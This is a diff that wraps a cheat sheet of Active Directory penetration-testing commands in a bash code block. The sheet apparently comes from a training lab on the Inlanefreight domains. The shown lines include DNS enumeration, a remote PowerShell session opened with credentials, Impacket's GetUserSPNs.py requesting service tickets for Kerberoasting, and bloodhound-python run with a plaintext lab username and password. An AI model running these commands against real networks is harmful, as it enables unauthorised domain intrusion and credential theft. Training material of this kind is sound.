@@ -1,4 +1,4 @@
-
+```bash
 Initial Enumeration
 Command 	Description
 nslookup ns1.inlanefreight.com 	Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.
@@ -272,4 +272,4 @@ Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential
 GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley 	Impacket tool used to request (-request) the TGS ticket of an account in a target Windows domain (-target-domain) from a Linux-based host.
 bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2 	Runs the Python implementation of BloodHound against a target Windows domain from a Linux-based host.
 zip -r ilfreight_bh.zip *.json 	Used to compress multiple files into 1 single .zip file to be uploaded into the BloodHound GUI.
-
+```
